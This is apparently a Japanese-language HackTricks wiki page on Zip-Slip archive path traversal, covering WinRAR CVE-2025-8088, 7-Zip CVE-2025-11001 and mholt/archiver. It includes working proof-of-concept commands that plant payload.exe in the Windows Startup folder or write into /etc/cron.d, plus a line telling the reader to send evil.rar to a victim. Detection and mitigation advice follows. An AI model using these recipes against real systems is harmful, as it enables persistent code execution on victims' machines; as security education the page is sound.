# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## 概要

多くの archive format（ZIP、RAR、TAR、7-ZIP など）では、各エントリに独自の **internal path** を持たせることができます。extraction utility がそのパスを無条件に受け入れると、`..` や **absolute path**（例: `C:\Windows\System32\`）を含む細工されたファイル名が、ユーザーが指定したディレクトリの外部に書き込まれます。
この種の脆弱性は、*Zip-Slip* または **archive extraction path traversal** として広く知られています。

影響は任意ファイルの上書きから、Windows の *Startup* folder などの **auto-run** location に payload を配置して **remote code execution (RCE)** を直接達成することまで及びます。

## 根本原因

1. Attacker は、1 つ以上の file header に以下を含む archive を作成します。
* Relative traversal sequences（`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`）
* Absolute paths（`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`）
* または、target dir の外部に解決される細工された **symlinks**（*nix* の ZIP/TAR で一般的）。
2. Victim は、埋め込まれたパスを信頼する（または symlinks に従う）vulnerable tool を使って archive を extract します。この tool はパスを sanitise したり、選択されたディレクトリ配下への extraction を強制したりしません。
3. File は attacker が制御する location に書き込まれ、次回そのパスを system または user が trigger した際に実行または load されます。

### .NET `Path.Combine` + `ZipArchive` traversal

.NET でよくある anti-pattern は、意図した destination と **user-controlled** な `ZipArchiveEntry.FullName` を結合し、パスを normalisation せずに extract することです。<sup>[[4]](#references)</sup>
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- `entry.FullName` が `..\\` で始まる場合は path traversal が発生します。**absolute path** の場合、左側のコンポーネント全体が破棄され、extraction identity として **arbitrary file write** が可能になります。
- scheduled scanner に監視されている sibling `app` directory に書き込むための Proof-of-concept archive:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
その ZIP を監視対象の inbox に配置すると、`C:\samples\app\0xdf.txt` が生成され、`C:\samples\queue\` の外部への traversal が可能であることが証明され、後続の攻撃手段（例：DLL hijacks）が利用可能になります。

## Real-World Example – WinRAR ≤ 7.12 (CVE-2025-8088)

Windows 版 WinRAR（`rar` / `unrar` CLI、DLL、portable source を含む）は、extraction 中のファイル名の検証に失敗していました。
次のようなエントリを含む malicious RAR archive は:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
は選択した出力ディレクトリの**外側**に移動し、ユーザーの *Startup* フォルダ内に配置されることになります。ログオン後、Windows はそこに存在するすべてのものを自動的に実行するため、*persistent* な RCE が可能になります。<sup>[[5]](#references)</sup>

### PoC Archive の作成（Linux/Mac）
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
使用したオプション:
* `-ep`  – ファイルパスを指定どおり正確に保存する（先頭の `./` を削除しない）。

`evil.rar` を被害者に送り、脆弱な WinRAR ビルドで展開するよう指示します。

### 実環境で確認された Exploitation

ESET は、RomCom（Storm-0978/UNC2596）による spear-phishing キャンペーンを報告しました。このキャンペーンでは、CVE-2025-8088 を悪用する RAR アーカイブを添付し、カスタマイズされた backdoor の展開や ransomware 活動を促進していました。<sup>[[5]](#references)</sup>

## 新しい事例（2024–2025）

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: **symbolic link** である ZIP エントリが展開時に dereference され、攻撃者が展開先ディレクトリから脱出して任意のパスを上書きできました。ユーザー操作はアーカイブを*開く／展開する*だけです。<sup>[[1]](#references)</sup>
* **Affected**: 7-Zip 21.02–24.09（Windows および Linux ビルド）。**25.00**（2025 年 7 月）以降で修正済み。
* **Impact path**: `Start Menu/Programs/Startup` または service-run locations を上書きすると、次回の logon または service restart 時に code が実行されます。
* **Quick PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
patch 適用済みの build では `/etc/cron.d` は変更されず、symlink が `/tmp/target` 内の link として展開されます。

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()` は `../` および symlink された ZIP エントリを追跡し、`outputDir` の外部に書き込みます。<sup>[[2]](#references)</sup>
* **Affected**: `github.com/mholt/archiver` ≤ 3.5.1（現在は deprecated）。
* **Fix**: `mholt/archives` ≥ 0.1.0 に切り替えるか、書き込み前に canonical-path checks を実装します。
* **Minimal reproduction**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Detection Tips

* **Static inspection** – アーカイブエントリを一覧表示し、`../`、`..\\`、*absolute paths*（`/`、`C:`）、または展開ディレクトリ外を指す *symlink* タイプのエントリを含む名前を flag します。
* **Canonicalisation** – `realpath(join(dest, name))` が依然として `dest` で始まっていることを確認します。そうでなければ reject します。<sup>[[3]](#references)</sup>
* **Sandbox extraction** – *safe* extractor（例: `bsdtar --safe --xattrs --no-same-owner`、7-Zip ≥ 25.00）を使用して使い捨てのディレクトリに decompress し、生成されたパスがディレクトリ内に留まっていることを確認します。
* **Endpoint monitoring** – WinRAR、7-Zip などでアーカイブが開かれた直後に、`Startup`／`Run`／`cron` locations に新しい executable が書き込まれた場合に alert します。

## Mitigation & Hardening

1. **Update the extractor** – WinRAR 7.13+ および 7-Zip 25.00+ は path／symlink sanitisation を実装しています。どちらの tool も auto-update には未対応です。
2. 可能な場合は、アーカイブを “**Do not extract paths**”／“**Ignore paths**” を指定して展開します。
3. Unix では、展開前に privileges を drop し、**chroot/namespace** を mount します。Windows では **AppContainer** または sandbox を使用します。
4. custom code を記述する場合は、create／write **前**に `realpath()`／`PathCanonicalize()` で normalise し、展開先から脱出するエントリを reject します。

## Additional Affected / Historical Cases

* 2018 – Snyk による大規模な *Zip-Slip* advisory。多数の Java／Go／JS libraries に影響。
* 2023 – `-ao` merge 中の同様の traversal である 7-Zip CVE-2023-4011。
* 2025 – HashiCorp `go-slug`（CVE-2025-0377）。slugs における TAR extraction traversal（v1.2 で patch）。
* write 前に `PathCanonicalize`／`realpath` を呼び出さない custom extraction logic 全般。

## References

- [1] [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [2] [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [3] [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [4] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [ESET Research – Update WinRAR tools now: RomCom and others exploiting zero-day vulnerability (CVE-2025-8088)](https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/)

{{#include ../banners/hacktricks-training.md}}
